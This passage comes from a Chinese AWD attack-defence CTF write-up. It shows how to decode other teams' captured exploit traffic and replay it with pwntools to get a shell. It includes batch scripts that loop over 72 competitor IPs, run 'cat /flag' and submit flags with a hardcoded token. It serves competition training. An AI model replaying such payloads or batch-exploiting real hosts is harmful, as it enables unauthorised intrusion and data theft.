+0x31, 0x37, 0x0a };
+char peer0_4[] = { /* Packet 33 */
+0x73, 0x68, 0x0a, 0x65, 0x63, 0x68, 0x6f, 0x20, 
+0x61, 0x39, 0x30, 0x61, 0x33, 0x35, 0x35, 0x66, 
+0x38, 0x64, 0x64, 0x62, 0x61, 0x36, 0x62, 0x32, 
+0x3b, 0x63, 0x61, 0x74, 0x20, 0x2f, 0x66, 0x6c, 
+0x61, 0x67, 0x3b, 0x65, 0x63, 0x68, 0x6f, 0x20, 
+0x39, 0x64, 0x63, 0x36, 0x31, 0x61, 0x36, 0x65, 
+0x37, 0x31, 0x39, 0x35, 0x63, 0x61, 0x39, 0x39, 
+0x0a };
+char peer0_5[] = { /* Packet 36 */
+0x65, 0x63, 0x68, 0x6f, 0x20, 0x39, 0x61, 0x33, 
+0x39, 0x36, 0x65, 0x61, 0x31, 0x33, 0x31, 0x63, 
+0x34, 0x38, 0x61, 0x32, 0x61, 0x0a };
+char peer0_6[] = { /* Packet 39 */
+0x65, 0x63, 0x68, 0x6f, 0x20, 0x61, 0x39, 0x30, 
+0x61, 0x33, 0x35, 0x35, 0x66, 0x38, 0x64, 0x64, 
+0x62, 0x61, 0x36, 0x62, 0x32, 0x3b, 0x63, 0x61, 
+0x74, 0x20, 0x2f, 0x66, 0x6c, 0x61, 0x67, 0x3b, 
+0x65, 0x63, 0x68, 0x6f, 0x20, 0x39, 0x64, 0x63, 
+0x36, 0x31, 0x61, 0x36, 0x65, 0x37, 0x31, 0x39, 
+0x35, 0x63, 0x61, 0x39, 0x39, 0x0a };
+char peer0_7[] = { /* Packet 44 */
+0x65, 0x63, 0x68, 0x6f, 0x20, 0x39, 0x61, 0x33, 
+0x39, 0x36, 0x65, 0x61, 0x31, 0x33, 0x31, 0x63, 
+0x34, 0x38, 0x61, 0x32, 0x61, 0x0a };
+&apos;&apos;&apos;</span>
+
+ss = a.split(<span class="hljs-string">&apos;;&apos;</span>)[:<span class="hljs-number">-1</span>]
+ct = <span class="hljs-string">&apos;&apos;</span>
+packets = []
+<span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> ss:
+    tmp = s.strip(<span class="hljs-string">&apos;\nchar &apos;</span>)
+    tmp = tmp.replace(<span class="hljs-string">&apos;[]&apos;</span>,<span class="hljs-string">&apos;&apos;</span>)
+    tmp1 = tmp.split(<span class="hljs-string">&apos;/&apos;</span>)
+    tmp2 = <span class="hljs-string">&apos;&apos;</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(tmp1)):
+        <span class="hljs-keyword">if</span> i!=<span class="hljs-number">1</span>:
+            tmp2+=tmp1[i]
+    tmp2 = tmp2.replace(<span class="hljs-string">&apos;\n&apos;</span>,<span class="hljs-string">&apos;&apos;</span>)
+    tmp2 = tmp2.replace(<span class="hljs-string">&apos;{&apos;</span>,<span class="hljs-string">&apos;[&apos;</span>)
+    tmp2 = tmp2.replace(<span class="hljs-string">&apos;}&apos;</span>, <span class="hljs-string">&apos;]&apos;</span>)
+    tmp2 = tmp2.replace(<span class="hljs-string">&apos; &apos;</span>,<span class="hljs-string">&apos;&apos;</span>)
+    <span class="hljs-keyword">print</span> tmp2
+    c = tmp2.split(<span class="hljs-string">&apos;[&apos;</span>)[<span class="hljs-number">1</span>]
+    c = c.replace(<span class="hljs-string">&apos;]&apos;</span>,<span class="hljs-string">&apos;&apos;</span>)
+    c = c.split(<span class="hljs-string">&apos;,&apos;</span>)
+    packet = <span class="hljs-string">&apos;&apos;</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:
+        packet += chr(int(i,<span class="hljs-number">16</span>))
+    packets.append(packet)
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(packets)):
+    <span class="hljs-keyword">print</span> <span class="hljs-string">&apos;packet&apos;</span>+str(i)+<span class="hljs-string">&apos;=====&gt;&apos;</span>+packets[i] ,
+</code></pre>
+<p>&#x6267;&#x884C;&#x6548;&#x679C;</p>
+<p><img src="4.png" alt=""></p>
+<h4 id="3&#x672C;&#x5730;&#x9A8C;&#x8BC1;">3.&#x672C;&#x5730;&#x9A8C;&#x8BC1;</h4>
+<p>&#x9A8C;&#x8BC1;&#x811A;&#x672C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5728;strip.py&#x7684;&#x57FA;&#x7840;&#x4E0A;&#x76F4;&#x63A5;&#x4FEE;&#x6539;</p>
+<pre><code class="lang-python">a = <span class="hljs-string">&apos;&apos;&apos;
+char peer0_0[] = { /* Packet 28 */
+0x31, 0x33, 0x0a };
+char peer0_1[] = { /* Packet 30 */
+0x30, 0x00, 0x07, 0x00, 0x2f, 0x62, 0x69, 0x6e, 
+0x2f, 0x73, 0x68, 0x33, 0x00 };
+char peer0_2[] = { /* Packet 31 */
+0x65, 0x78, 0x65, 0x63, 0x20, 0x73, 0x68, 0x20, 
+0x2d, 0x69, 0x0a };
+char peer0_3[] = { /* Packet 32 */
+0x74, 0x72, 0x61, 0x70, 0x20, 0x22, 0x22, 0x20, 
+0x31, 0x20, 0x32, 0x20, 0x33, 0x20, 0x34, 0x20, 
+0x35, 0x20, 0x36, 0x20, 0x37, 0x20, 0x38, 0x20, 
+0x39, 0x20, 0x31, 0x34, 0x20, 0x31, 0x35, 0x20, 
+0x31, 0x37, 0x0a };
+char peer0_4[] = { /* Packet 33 */
+0x73, 0x68, 0x0a, 0x65, 0x63, 0x68, 0x6f, 0x20, 
+0x61, 0x39, 0x30, 0x61, 0x33, 0x35, 0x35, 0x66, 
+0x38, 0x64, 0x64, 0x62, 0x61, 0x36, 0x62, 0x32, 
+0x3b, 0x63, 0x61, 0x74, 0x20, 0x2f, 0x66, 0x6c, 
+0x61, 0x67, 0x3b, 0x65, 0x63, 0x68, 0x6f, 0x20, 
+0x39, 0x64, 0x63, 0x36, 0x31, 0x61, 0x36, 0x65, 
+0x37, 0x31, 0x39, 0x35, 0x63, 0x61, 0x39, 0x39, 
+0x0a };
+char peer0_5[] = { /* Packet 36 */
+0x65, 0x63, 0x68, 0x6f, 0x20, 0x39, 0x61, 0x33, 
+0x39, 0x36, 0x65, 0x61, 0x31, 0x33, 0x31, 0x63, 
+0x34, 0x38, 0x61, 0x32, 0x61, 0x0a };
+char peer0_6[] = { /* Packet 39 */
+0x65, 0x63, 0x68, 0x6f, 0x20, 0x61, 0x39, 0x30, 
+0x61, 0x33, 0x35, 0x35, 0x66, 0x38, 0x64, 0x64, 
+0x62, 0x61, 0x36, 0x62, 0x32, 0x3b, 0x63, 0x61, 
+0x74, 0x20, 0x2f, 0x66, 0x6c, 0x61, 0x67, 0x3b, 
+0x65, 0x63, 0x68, 0x6f, 0x20, 0x39, 0x64, 0x63, 
+0x36, 0x31, 0x61, 0x36, 0x65, 0x37, 0x31, 0x39, 
+0x35, 0x63, 0x61, 0x39, 0x39, 0x0a };
+char peer0_7[] = { /* Packet 44 */
+0x65, 0x63, 0x68, 0x6f, 0x20, 0x39, 0x61, 0x33, 
+0x39, 0x36, 0x65, 0x61, 0x31, 0x33, 0x31, 0x63, 
+0x34, 0x38, 0x61, 0x32, 0x61, 0x0a };
+&apos;&apos;&apos;</span>
+
+ss = a.split(<span class="hljs-string">&apos;;&apos;</span>)[:<span class="hljs-number">-1</span>]
+ct = <span class="hljs-string">&apos;&apos;</span>
+packets = []
+<span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> ss:
+    tmp = s.strip(<span class="hljs-string">&apos;\nchar &apos;</span>)
+    tmp = tmp.replace(<span class="hljs-string">&apos;[]&apos;</span>,<span class="hljs-string">&apos;&apos;</span>)
+    tmp1 = tmp.split(<span class="hljs-string">&apos;/&apos;</span>)
+    tmp2 = <span class="hljs-string">&apos;&apos;</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(tmp1)):
+        <span class="hljs-keyword">if</span> i!=<span class="hljs-number">1</span>:
+            tmp2+=tmp1[i]
+    tmp2 = tmp2.replace(<span class="hljs-string">&apos;\n&apos;</span>,<span class="hljs-string">&apos;&apos;</span>)
+    tmp2 = tmp2.replace(<span class="hljs-string">&apos;{&apos;</span>,<span class="hljs-string">&apos;[&apos;</span>)
+    tmp2 = tmp2.replace(<span class="hljs-string">&apos;}&apos;</span>, <span class="hljs-string">&apos;]&apos;</span>)
+    tmp2 = tmp2.replace(<span class="hljs-string">&apos; &apos;</span>,<span class="hljs-string">&apos;&apos;</span>)
+    <span class="hljs-keyword">print</span> tmp2
+    c = tmp2.split(<span class="hljs-string">&apos;[&apos;</span>)[<span class="hljs-number">1</span>]
+    c = c.replace(<span class="hljs-string">&apos;]&apos;</span>,<span class="hljs-string">&apos;&apos;</span>)
+    c = c.split(<span class="hljs-string">&apos;,&apos;</span>)
+    packet = <span class="hljs-string">&apos;&apos;</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:
+        packet += chr(int(i,<span class="hljs-number">16</span>))
+    packets.append(packet)
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(packets)):
+    <span class="hljs-keyword">print</span> <span class="hljs-string">&apos;packet&apos;</span>+str(i)+<span class="hljs-string">&apos;=====&gt;&apos;</span>+packets[i] ,
+
+
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*
+<span class="hljs-comment">#context.log_level = &apos;debug&apos;</span>
+p = process(<span class="hljs-string">&apos;./pwn&apos;</span>)
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> packets:
+    p.send(i)
+    sleep(<span class="hljs-number">0.1</span>)
+p.interactive()
+</code></pre>
+<p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x5728;&#x672C;&#x5730;&#x8FD0;&#x884C;&#x811A;&#x672C;&#x5DF2;&#x7ECF;&#x53EF;&#x4EE5;&#x62FF;&#x5230;shell&#x4E86;&#x3002;</p>
+<p><img src="5.png" alt=""></p>
+<p>&#x5047;&#x5982;&#x60F3;&#x8981;&#x9A8C;&#x8BC1;&#x8FDC;&#x7A0B;&#x662F;&#x5426;&#x53EF;&#x884C;&#xFF0C;&#x53EF;&#x4EE5;&#x5148;&#x628A;p = process(&apos;./pwn&apos;)&#x6362;&#x6210; p = remote(&apos;&apos;,port)&#x5373;&#x53EF;&#x9A8C;&#x8BC1;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x662F;ip&#x5730;&#x5740;&#xFF0C;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x662F;&#x7AEF;&#x53E3;&#x3002;</p>
+<p>&#x5047;&#x5982;&#x6279;&#x91CF;&#x811A;&#x672C;&#x6CA1;&#x5199;&#x51FA;&#x6765;&#x5C31;&#x53EA;&#x80FD;&#x4E00;&#x4E2A;ip&#x4E00;&#x4E2A;ip&#x8BD5;&#x8FC7;&#x53BB;&#x4E86;&#x3002;</p>
+<p>&#x4E00;&#x822C;&#x6765;&#x8BB2;context.log_level = &apos;debug&apos;&#x4E0D;&#x7528;&#x6CE8;&#x91CA;&#xFF0C;&#x4F1A;&#x8F93;&#x51FA;&#x4EA4;&#x4E92;&#x7684;&#x4FE1;&#x606F;&#x3002;</p>
+<h4 id="4&#x6279;&#x91CF;&#x811A;&#x672C;">4.&#x6279;&#x91CF;&#x811A;&#x672C;</h4>
+<p>&#x8FD9;&#x662F;&#x5F53;&#x65F6;&#x6279;&#x91CF;&#x7684;&#x811A;&#x672C;&#xFF0C;&#x5047;&#x5982;&#x60F3;&#x8981;&#x4FEE;&#x6539;&#x7684;&#x8BDD;&#x5C31;&#x628A;&#x51E0;&#x4E2A;send&#x6362;&#x6210;&#x672C;&#x5730;&#x9A8C;&#x8BC1;&#x90A3;&#x6837;&#x53D1;&#x9001;&#x5C31;&#x884C;&#x3002;&#x4F46;&#x6709;&#x4E00;&#x4E2A;&#x6BD4;&#x8F83;&#x5934;&#x75BC;&#x7684;&#x95EE;&#x9898;&#x662F;&#x662F;flag&#x63A5;&#x6536;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x62FF;&#x5230;shell&#x4E4B;&#x540E;&#x53EF;&#x4EE5;&#x91C7;&#x7528;echo &#x7279;&#x5B9A;&#x5B57;&#x7B26;&#xFF0C;&#x7136;&#x540E;recvuntil&#x90A3;&#x4E9B;&#x5B57;&#x7B26;&#xFF0C;&#x6700;&#x540E;&#x518D;&#x53D1;&#x9001;&#x4E00;&#x904D;cat flag&#x5E76;&#x4E14;recv&#x5C31;&#x53EF;&#x4EE5;&#x628A;&#x5B83;&#x5B58;&#x8FDB;&#x53D8;&#x91CF;&#x91CC;&#x5E76;&#x6279;&#x91CF;&#x63D0;&#x4EA4;&#x4E86;</p>
+<pre><code class="lang-python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*
+<span class="hljs-keyword">import</span> requests
+ok = <span class="hljs-number">0</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">submit</span><span class="hljs-params">(flag)</span>:</span>    
+    url = <span class="hljs-string">&apos;http://10.10.10.10/api/v1/att_def/web/submit_flag/?event_id=21&apos;</span>
+    data = {<span class="hljs-string">&apos;flag&apos;</span>:flag,<span class="hljs-string">&apos;token&apos;</span>:<span class="hljs-string">&apos;NEQEKjQAW6YXqW7SSFMaEA8j4W5STUXVE7vuVDbtQmwDT&apos;</span>}
+    ct = requests.post(url=url,data=data)
+    <span class="hljs-keyword">print</span> ct.content
+    <span class="hljs-keyword">if</span> ct.text.find(<span class="hljs-string">&apos;false&apos;</span>)!=<span class="hljs-number">-1</span>:
+        <span class="hljs-keyword">print</span> <span class="hljs-string">&apos;error!&apos;</span>
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">print</span> <span class="hljs-string">&apos;ok&apos;</span>
+        ok += <span class="hljs-number">1</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pr</span><span class="hljs-params">(a,addr)</span>:</span>
+    log.success(a+<span class="hljs-string">&apos;====&gt;&apos;</span>+hex(addr))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span><span class="hljs-params">(target)</span>:</span>
+    p = remote(<span class="hljs-string">&apos;172.35.%d.15&apos;</span>%target,<span class="hljs-number">9999</span>,timeout=<span class="hljs-number">2</span>)
+
+    p.sendlineafter(<span class="hljs-string">&apos;How big is your program: &apos;</span>,<span class="hljs-string">&apos;12&apos;</span>)
+    a1 = [
+    <span class="hljs-number">0x30</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6e</span>,
+    <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x00</span> ]
+    ct1 = <span class="hljs-string">&apos;&apos;</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a1:
+        ct1+=chr(i)
+    p.send(ct1)
+
+    p.sendline(<span class="hljs-string">&apos;echo a90a355f8ddba6b2;cat /flag;echo 9dc61a6e7195ca99&apos;</span>)
+    p.recvline()
+    flag = p.recvline()[:<span class="hljs-number">-1</span>]
+    submit(flag)
+    flags.append([target,flag])
+    print(<span class="hljs-string">&apos;flag====&gt;&apos;</span>+flag)
+    p.close()
+
+<span class="hljs-comment">#context.log_level = &apos;debug&apos;</span>
+
+flags = []
+ip = [<span class="hljs-number">56</span>]
+ip = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">73</span>)]
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ip:
+    <span class="hljs-keyword">try</span>:
+        pwn(i)
+    <span class="hljs-keyword">except</span>:
+        print(<span class="hljs-string">&apos;pwn error!&apos;</span>)
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flags:
+    <span class="hljs-keyword">print</span> str(i[<span class="hljs-number">0</span>])+<span class="hljs-string">&apos;===&gt;&apos;</span>+i[<span class="hljs-number">1</span>]
+<span class="hljs-keyword">print</span> len(flags)
+<span class="hljs-keyword">print</span> <span class="hljs-string">&apos;ok!!!==&gt;&apos;</span>+str(ok)
+</code></pre>
+<h3 id="&#x4F8B;2&#xFF1A;ciscn&#x67D0;&#x6B21;awd&#x9898;&#x76EE;-cryptopark">&#x4F8B;2&#xFF1A;ciscn&#x67D0;&#x6B21;awd&#x9898;&#x76EE; cryptopark</h3>
+<h4 id="&#x9009;&#x53D6;&#x6D41;&#x91CF;">&#x9009;&#x53D6;&#x6D41;&#x91CF;</h4>
+<p>&#x53D1;&#x4E86;&#x8FD9;&#x4E48;&#x591A;&#xFF0C;&#x6700;&#x540E;&#x8FD8;cat flag&#xFF0C;&#x5C31;&#x51B3;&#x5B9A;&#x662F;&#x4F60;&#x4E86;</p>
+<p><img src="6.png" alt=""></p>
+<h4 id="&#x672C;&#x5730;&#x9A8C;&#x8BC1;">&#x672C;&#x5730;&#x9A8C;&#x8BC1;</h4>
+<p>&#x672C;&#x5730;&#x9A8C;&#x8BC1;&#x5176;&#x5B9E;&#x548C;&#x521A;&#x521A;&#x4E00;&#x6A21;&#x4E00;&#x6837;&#x3002;&#x3002;&#x53EA;&#x4E0D;&#x8FC7;&#x628A;&#x8FD9;&#x91CC;a&#x91CC;&#x9762;&#x5185;&#x5BB9;&#x91CD;&#x65B0;&#x590D;&#x5236;&#x4E00;&#x4E0B;</p>
+<pre><code class="lang-python">a = <span class="hljs-string">&apos;&apos;&apos;
+char peer0_0[] = { /* Packet 679 */
+0x35, 0x0a };
+char peer0_1[] = { /* Packet 682 */
+0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 
+0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 
+0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 
+0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 
+0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 
+0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 
+0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 
+0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 
+0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 
+0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 
+0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 
+0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 
+0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 
+0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 
+0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 
+0x0a };
+char peer0_2[] = { /* Packet 685 */
+0x31, 0x0a };
+char peer0_3[] = { /* Packet 687 */
+0x30, 0x0a };
+char peer0_4[] = { /* Packet 689 */
+0x39, 0x38, 0x35, 0x0a };
+char peer0_5[] = { /* Packet 691 */
+0x31, 0x30, 0x0a };
+char peer0_6[] = { /* Packet 693 */
+0x39, 0x38, 0x35, 0x0a };
+char peer0_7[] = { /* Packet 695 */
+0x31, 0x30, 0x0a };
+char peer0_8[] = { /* Packet 697 */
+0x31, 0x0a };
+char peer0_9[] = { /* Packet 699 */
+0x31, 0x0a };
+char peer0_10[] = { /* Packet 701 */
+0x32, 0x0a };
+char peer0_11[] = { /* Packet 704 */
+0x31, 0x0a };
+char peer0_12[] = { /* Packet 707 */
+0x32, 0x0a };
+char peer0_13[] = { /* Packet 710 */
+0x31, 0x0a };
+char peer0_14[] = { /* Packet 713 */
+0x31, 0x0a };
+char peer0_15[] = { /* Packet 716 */
+0x32, 0x0a };
+char peer0_16[] = { /* Packet 719 */
+0x33, 0x0a };
+char peer0_17[] = { /* Packet 722 */
+0x32, 0x0a };
+char peer0_18[] = { /* Packet 725 */
+0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 
+0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 
+0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 
+0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 
+0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 
+0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 
+0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 
+0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 0x61, 
+0x36, 0x0a };
+char peer0_19[] = { /* Packet 728 */
+0x66, 0x6c, 0x61, 0x70, 0x70, 0x79, 0x62, 0x69, 
+0x72, 0x64, 0x36, 0x36, 0x36, 0x36, 0x36, 0x36, 
+0x0a };
+char peer0_20[] = { /* Packet 731 */
+0x63, 0x61, 0x74, 0x20, 0x66, 0x6c, 0x61, 0x67, 
+0x0a };
+&apos;&apos;&apos;</span>
+
+ss = a.split(<span class="hljs-string">&apos;;&apos;</span>)[:<span class="hljs-number">-1</span>]
+ct = <span class="hljs-string">&apos;&apos;</span>
+packets = []
+<span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> ss:
+    tmp = s.strip(<span class="hljs-string">&apos;\nchar &apos;</span>)
+    tmp = tmp.replace(<span class="hljs-string">&apos;[]&apos;</span>,<span class="hljs-string">&apos;&apos;</span>)
+    tmp1 = tmp.split(<span class="hljs-string">&apos;/&apos;</span>)
+    tmp2 = <span class="hljs-string">&apos;&apos;</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(tmp1)):
+        <span class="hljs-keyword">if</span> i!=<span class="hljs-number">1</span>:
+            tmp2+=tmp1[i]
+    tmp2 = tmp2.replace(<span class="hljs-string">&apos;\n&apos;</span>,<span class="hljs-string">&apos;&apos;</span>)
+    tmp2 = tmp2.replace(<span class="hljs-string">&apos;{&apos;</span>,<span class="hljs-string">&apos;[&apos;</span>)
+    tmp2 = tmp2.replace(<span class="hljs-string">&apos;}&apos;</span>, <span class="hljs-string">&apos;]&apos;</span>)
+    tmp2 = tmp2.replace(<span class="hljs-string">&apos; &apos;</span>,<span class="hljs-string">&apos;&apos;</span>)
+    <span class="hljs-keyword">print</span> tmp2
+    c = tmp2.split(<span class="hljs-string">&apos;[&apos;</span>)[<span class="hljs-number">1</span>]
+    c = c.replace(<span class="hljs-string">&apos;]&apos;</span>,<span class="hljs-string">&apos;&apos;</span>)
+    c = c.split(<span class="hljs-string">&apos;,&apos;</span>)
+    packet = <span class="hljs-string">&apos;&apos;</span>
+    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:
+        packet += chr(int(i,<span class="hljs-number">16</span>))
+    packets.append(packet)
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(len(packets)):
+    <span class="hljs-keyword">print</span> <span class="hljs-string">&apos;packet&apos;</span>+str(i)+<span class="hljs-string">&apos;=====&gt;&apos;</span>+packets[i] ,
+
+
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*
+context.log_level = <span class="hljs-string">&apos;debug&apos;</span>
+p = process(<span class="hljs-string">&apos;./pwn&apos;</span>)
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> packets:
+    p.send(i)
+    sleep(<span class="hljs-number">0.1</span>)
+p.interactive()
+</code></pre>
+<p>&#x811A;&#x672C;&#x6709;&#x6548;</p>
+<p><img src="7.png" alt=""></p>
+<h4 id="&#x6279;&#x91CF;&#x811A;&#x672C;">&#x6279;&#x91CF;&#x811A;&#x672C;</h4>
+<p>&#x5F53;&#x65F6;&#x5199;&#x7684;&#x811A;&#x672C;</p>
+<pre><code class="lang-python"><span class="hljs-comment"># -*- coding:utf-8 -*-</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*
+<span class="hljs-keyword">import</span> requests
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">submit</span><span class="hljs-params">(flag)</span>:</span>    
+    url = <span class="hljs-string">&apos;http://10.10.10.10/api/v1/att_def/web/submit_flag/?event_id=21&apos;</span>
+    data = {<span class="hljs-string">&apos;flag&apos;</span>:flag,<span class="hljs-string">&apos;token&apos;</span>:<span class="hljs-string">&apos;NEQEKjQAW6YXqW7SSFMaEA8j4W5STUXVE7vuVDbtQmwDT&apos;</span>}
+    ct = requests.post(url=url,data=data)
+    <span class="hljs-keyword">print</span> ct.content
+    <span class="hljs-keyword">if</span> ct.text.find(<span class="hljs-string">&apos;false&apos;</span>)!=<span class="hljs-number">-1</span>:
+        <span class="hljs-keyword">print</span> <span class="hljs-string">&apos;error!&apos;</span>
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">print</span> <span class="hljs-string">&apos;ok&apos;</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pr</span><span class="hljs-params">(a,addr)</span>:</span>
+    log.success(a+<span class="hljs-string">&apos;====&gt;&apos;</span>+hex(addr))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pwn</span><span class="hljs-params">(target)</span>:</span>
+    p = remote(<span class="hljs-string">&apos;172.35.%d.14&apos;</span>%target,<span class="hljs-number">9999</span>,timeout=<span class="hljs-number">2</span>)
+    p.sendline(<span class="hljs-string">&apos;5&apos;</span>)
+    p.sendline(<span class="hljs-string">&apos;a&apos;</span>*<span class="hljs-number">0x78</span>)
+    p.sendline(<span class="hljs-string">&apos;1&apos;</span>)
+    p.sendline(<span class="hljs-string">&apos;0&apos;</span>)
+
+    p.sendline(<span class="hljs-string">&apos;985&apos;</span>)
+    p.sendline(<span class="hljs-string">&apos;10&apos;</span>)
+
+    p.sendline(<span class="hljs-string">&apos;985&apos;</span>)
+    p.sendline(<span class="hljs-string">&apos;10&apos;</span>)
+
+    p.sendline(<span class="hljs-string">&apos;1&apos;</span>)
+    p.sendline(<span class="hljs-string">&apos;1&apos;</span>)
+    p.sendline(<span class="hljs-string">&apos;2&apos;</span>)
+    p.sendline(<span class="hljs-string">&apos;1&apos;</span>)
+
+    p.sendline(<span class="hljs-string">&apos;2&apos;</span>)
+    p.sendline(<span class="hljs-string">&apos;1&apos;</span>)
+    p.sendline(<span class="hljs-string">&apos;1&apos;</span>)
+    p.sendline(<span class="hljs-string">&apos;2&apos;</span>)
+
+    p.sendline(<span class="hljs-string">&apos;3&apos;</span>)
+    p.sendline(<span class="hljs-string">&apos;2&apos;</span>)
+    p.sendline(<span class="hljs-string">&apos;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&apos;</span>)
+
+    p.sendline(<span class="hljs-string">&apos;6&apos;</span>)
+    p.sendline(<span class="hljs-string">&apos;flappybird666666&apos;</span>)
+
+    p.sendline(<span class="hljs-string">&apos;echo a90a355f8ddba6b2;cat /flag;echo 9dc61a6e7195ca99&apos;</span>)
+    p.recvuntil(<span class="hljs-string">&apos;a90a355f8ddba6b2&apos;</span>)
+    <span class="hljs-keyword">print</span> <span class="hljs-string">&apos;1===&gt;&apos;</span>+p.recvline()
+    flag = p.recvline()[:<span class="hljs-number">-1</span>]
+    <span class="hljs-keyword">print</span> <span class="hljs-string">&apos;3===&gt;&apos;</span>+p.recvline()
+    <span class="hljs-keyword">print</span> <span class="hljs-string">&apos;flag====&gt;&apos;</span>+flag
+    flags.append([target,flag])
+    submit(flag)
+    p.close()
+
+<span class="hljs-comment">#context.log_level = &apos;debug&apos;</span>
+flags = []
+ip = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">73</span>)]
+<span class="hljs-comment">#ip = [68]</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ip:
+    <span class="hljs-keyword">try</span>:
+        pwn(i)
+    <span class="hljs-keyword">except</span>:
+        print(<span class="hljs-string">&apos;pwn error!&apos;</span>)
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flags:
+    <span class="hljs-keyword">print</span> str(i[<span class="hljs-number">0</span>])+<span class="hljs-string">&apos;==&gt;&apos;</span>+i[<span class="hljs-number">1</span>]
+</code></pre>
+<h3 id="&#x8981;&#x70B9;">&#x8981;&#x70B9;</h3>
+<ul>
+<li>&#x6D41;&#x91CF;&#x6700;&#x540E;&#x6709;&#x4E00;&#x4E9B;shell&#x547D;&#x4EE4;&#x7684;&#x4E00;&#x822C;&#x662F;&#x6210;&#x529F;&#x5229;&#x7528;&#x7684;</li>
+<li>&#x5047;&#x5982;&#x5229;&#x7528;&#x662F;&#x9700;&#x8981;&#x6CC4;&#x9732;libc&#x4FE1;&#x606F;&#x7684;&#xFF0C;&#x90A3;&#x4E00;&#x6A21;&#x4E00;&#x6837;&#x6253;&#x8FD8;&#x662F;&#x5927;&#x6982;&#x7387;&#x5931;&#x8D25;&#x7684;</li>
